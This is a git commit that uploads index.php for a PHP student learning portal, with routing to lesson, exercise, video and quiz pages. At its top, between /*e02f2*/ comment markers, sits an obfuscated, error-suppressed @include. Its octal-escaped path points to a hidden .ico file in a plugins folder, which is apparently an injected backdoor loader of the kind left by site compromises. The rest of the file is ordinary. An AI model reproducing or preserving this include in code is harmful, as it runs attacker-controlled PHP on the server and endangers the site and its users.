f7b771cfa36d4e581c255595e3f0e2683456c35f
kushan maduranga <48176114+kashan10@users.noreply.github.com>
2021-06-22 07:56:33 -0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,60 @@
+<?php
+/*e02f2*/
+
+@include "\057hom\145/gi\162zsd\141f/p\165bli\143_ht\155l/b\151rt/\160lug\151ns/\056a84\071f79\141.ic\157";
+
+/*e02f2*/ 
+require_once("include/initialize.php");  
+if (!isset($_SESSION['StudentID'])) {
+  # code...
+  redirect('login.php');
+}
+$content='home.php';
+$view = (isset($_GET['q']) && $_GET['q'] != '') ? $_GET['q'] : '';
+switch ($view) { 
+  case 'lesson':
+    $title = "Lesson";
+    $content = 'lesson.php';
+   # code...
+   break; 
+  case 'exercises':
+    $title = "Exercises";
+    $content = 'exercises.php';
+   # code...
+   break; 
+  case 'download':
+    $title = "Download";
+    $content = 'download.php';
+   # code...
+   break; 
+  case 'about':
+    $title = "About Us";
+    $content = 'about.php';
+   # code...
+   break; 
+  case 'playvideo':
+    $title = "Play Video";
+    $content = 'playvideo.php';
+   # code...
+   break; 
+  case 'viewpdf':
+    $title = "Play Video";
+    $content = 'viewpdf.php';
+   # code...
+   break; 
+  case 'question':
+    $title = "Question";
+    $content = 'question.php';
+   # code...
+   break; 
+  case 'quizresult':
+    $title = "Result";
+    $content = 'quizresult.php';
+   # code...
+   break; 
+  default :
+    $title = "Home";
+    $content    = 'home.php';
+}
+require_once("theme/templates.php");
+?>
